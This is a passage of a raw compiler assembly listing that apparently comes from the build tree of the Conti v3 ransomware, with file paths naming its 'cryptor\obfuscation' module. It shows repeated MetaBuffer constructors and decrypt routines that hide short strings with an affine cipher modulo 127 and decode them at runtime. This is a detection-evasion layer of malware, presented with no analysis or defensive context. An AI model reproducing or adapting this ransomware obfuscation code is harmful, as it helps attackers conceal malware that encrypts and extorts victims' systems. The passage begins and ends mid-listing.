?decrypt@?$MetaBuffer@$01$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<2,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$01$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$01$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<2,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<2,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 28	 mov	 BYTE PTR [rcx+1], 40	; 00000028H
  00007	c6 41 02 4b	 mov	 BYTE PTR [rcx+2], 75	; 0000004bH
  0000b	c6 41 03 27	 mov	 BYTE PTR [rcx+3], 39	; 00000027H
  0000f	c6 41 04 4b	 mov	 BYTE PTR [rcx+4], 75	; 0000004bH
  00013	c6 41 05 3b	 mov	 BYTE PTR [rcx+5], 59	; 0000003bH
  00017	c6 41 06 4b	 mov	 BYTE PTR [rcx+6], 75	; 0000004bH
  0001b	c6 41 07 11	 mov	 BYTE PTR [rcx+7], 17
  0001f	c6 41 08 4b	 mov	 BYTE PTR [rcx+8], 75	; 0000004bH
  00023	c6 41 09 4b	 mov	 BYTE PTR [rcx+9], 75	; 0000004bH
  00027	c6 41 0a 4b	 mov	 BYTE PTR [rcx+10], 75	; 0000004bH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$01$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<2,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<2,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$06$0FO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$06$0FO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<7,94,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 66		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 5e 00 00 00	 mov	 eax, 94			; 0000005eH
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c c0	 lea	 ecx, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	03 c9		 add	 ecx, ecx

; 40   :     return (a % n + n) % n;

  00039	f7 e9		 imul	 ecx
  0003b	03 d1		 add	 edx, ecx
  0003d	c1 fa 06	 sar	 edx, 6
  00040	8b c2		 mov	 eax, edx
  00042	c1 e8 1f	 shr	 eax, 31
  00045	03 d0		 add	 edx, eax
  00047	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004a	2b c8		 sub	 ecx, eax
  0004c	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00051	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00054	f7 e9		 imul	 ecx
  00056	03 d1		 add	 edx, ecx
  00058	c1 fa 06	 sar	 edx, 6
  0005b	8b c2		 mov	 eax, edx
  0005d	c1 e8 1f	 shr	 eax, 31
  00060	03 d0		 add	 edx, eax
  00062	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00065	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00067	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006b	49 83 ea 01	 sub	 r10, 1
  0006f	75 af		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00071	49 8b c0	 mov	 rax, r8
  00074	c3		 ret	 0
?decrypt@?$MetaBuffer@$06$0FO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<7,94,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$06$0FO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$06$0FO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<7,94,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<7,94,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 23	 mov	 BYTE PTR [rcx+1], 35	; 00000023H
  00007	c6 41 02 5e	 mov	 BYTE PTR [rcx+2], 94	; 0000005eH
  0000b	c6 41 03 5f	 mov	 BYTE PTR [rcx+3], 95	; 0000005fH
  0000f	c6 41 04 5e	 mov	 BYTE PTR [rcx+4], 94	; 0000005eH
  00013	c6 41 05 18	 mov	 BYTE PTR [rcx+5], 24
  00017	c6 41 06 5e	 mov	 BYTE PTR [rcx+6], 94	; 0000005eH
  0001b	c6 41 07 20	 mov	 BYTE PTR [rcx+7], 32	; 00000020H
  0001f	c6 41 08 5e	 mov	 BYTE PTR [rcx+8], 94	; 0000005eH
  00023	c6 41 09 5e	 mov	 BYTE PTR [rcx+9], 94	; 0000005eH
  00027	c6 41 0a 5e	 mov	 BYTE PTR [rcx+10], 94	; 0000005eH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$06$0FO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<7,94,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<7,94,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0L@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0L@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<11,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 39 00 00 00	 mov	 eax, 57			; 00000039H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 17	 imul	 ecx, eax, 23

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0L@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<11,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0L@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0L@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<11,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<11,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 37	 mov	 BYTE PTR [rcx+1], 55	; 00000037H
  00007	c6 41 02 39	 mov	 BYTE PTR [rcx+2], 57	; 00000039H
  0000b	c6 41 03 71	 mov	 BYTE PTR [rcx+3], 113	; 00000071H
  0000f	c6 41 04 39	 mov	 BYTE PTR [rcx+4], 57	; 00000039H
  00013	c6 41 05 29	 mov	 BYTE PTR [rcx+5], 41	; 00000029H
  00017	c6 41 06 39	 mov	 BYTE PTR [rcx+6], 57	; 00000039H
  0001b	c6 41 07 2f	 mov	 BYTE PTR [rcx+7], 47	; 0000002fH
  0001f	c6 41 08 39	 mov	 BYTE PTR [rcx+8], 57	; 00000039H
  00023	c6 41 09 39	 mov	 BYTE PTR [rcx+9], 57	; 00000039H
  00027	c6 41 0a 39	 mov	 BYTE PTR [rcx+10], 57	; 00000039H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0L@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<11,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<11,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GL@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GL@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<107,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 30	 sub	 ecx, 48			; 00000030H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 13	 imul	 r8d, ecx, 19

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GL@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<107,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GL@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GL@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<107,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<107,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 11	 mov	 BYTE PTR [rcx+1], 17
  00007	c6 41 02 30	 mov	 BYTE PTR [rcx+2], 48	; 00000030H
  0000b	c6 41 03 1b	 mov	 BYTE PTR [rcx+3], 27
  0000f	c6 41 04 30	 mov	 BYTE PTR [rcx+4], 48	; 00000030H
  00013	c6 41 05 5e	 mov	 BYTE PTR [rcx+5], 94	; 0000005eH
  00017	c6 41 06 30	 mov	 BYTE PTR [rcx+6], 48	; 00000030H
  0001b	c6 41 07 50	 mov	 BYTE PTR [rcx+7], 80	; 00000050H
  0001f	c6 41 08 30	 mov	 BYTE PTR [rcx+8], 48	; 00000030H
  00023	c6 41 09 30	 mov	 BYTE PTR [rcx+9], 48	; 00000030H
  00027	c6 41 0a 30	 mov	 BYTE PTR [rcx+10], 48	; 00000030H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0GL@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<107,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<107,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0ED@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<67,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 67		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 19 00 00 00	 mov	 eax, 25
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c c0	 lea	 ecx, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	c1 e1 02	 shl	 ecx, 2

; 40   :     return (a % n + n) % n;

  0003a	f7 e9		 imul	 ecx
  0003c	03 d1		 add	 edx, ecx
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	2b c8		 sub	 ecx, eax
  0004d	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00052	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00055	f7 e9		 imul	 ecx
  00057	03 d1		 add	 edx, ecx
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00068	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006c	49 83 ea 01	 sub	 r10, 1
  00070	75 ae		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00072	49 8b c0	 mov	 rax, r8
  00075	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<67,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0ED@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0ED@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<67,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<67,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 3b	 mov	 BYTE PTR [rcx+1], 59	; 0000003bH
  00007	c6 41 02 19	 mov	 BYTE PTR [rcx+2], 25
  0000b	c6 41 03 59	 mov	 BYTE PTR [rcx+3], 89	; 00000059H
  0000f	c6 41 04 19	 mov	 BYTE PTR [rcx+4], 25
  00013	c6 41 05 79	 mov	 BYTE PTR [rcx+5], 121	; 00000079H
  00017	c6 41 06 19	 mov	 BYTE PTR [rcx+6], 25
  0001b	c6 41 07 01	 mov	 BYTE PTR [rcx+7], 1
  0001f	c6 41 08 19	 mov	 BYTE PTR [rcx+8], 25
  00023	c6 41 09 19	 mov	 BYTE PTR [rcx+9], 25
  00027	c6 41 0a 19	 mov	 BYTE PTR [rcx+10], 25
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0ED@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<67,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<67,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$02$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$02$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<3,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

